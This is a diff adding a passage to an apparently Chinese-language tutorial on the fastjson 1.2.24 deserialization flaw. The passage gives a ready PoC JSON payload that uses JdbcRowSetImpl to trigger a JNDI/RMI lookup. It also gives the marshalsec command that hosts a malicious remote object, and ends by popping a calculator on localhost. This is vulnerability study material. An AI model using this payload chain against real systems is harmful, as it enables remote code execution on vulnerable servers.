@@ -178,6 +178,26 @@ setAutoCommit
 
 可以看到这里connect方法中有典型的jndi的lookup方法调用，且参数就是我们在setDataSourceName中设置的dataSourceName。
 
+具体的代码就先不分析了，fastjson反序列化的流程大概就是先进行json数据的解析，我个人认为这个分析是个体力活，一步一步调试就行了，就没必要再写出来了。然后我们现在知道了上面两个setXXX方法有问题，怎么构造poc呢？如下就行：
+
+`{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1099/Evil", "autoCommit":true}}`
+
+可见dataSourceName的值为我们恶意的rmi对象，之前我们都是自己写代码注册rmi对象的，现在介绍一个线程的部署rmi服务的工具：
+
+https://github.com/mbechler/marshalsec
+
+需要自己用maven工具生成jar包，使用说明中有介绍，我们用该工具快速搭建一个rmi服务器，并把恶意的远程对象注册到上面，使用如下命令：
+
+`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8000/#Evil`
+
+其中我们的恶意对象是放在本地的一个运行在8000端口的web服务上的（我们可以用python快速搭建一个web服务器）
+
+弹个计算器
+
+![](fastjson1224/calc.png)
+
+
+
 
 
 
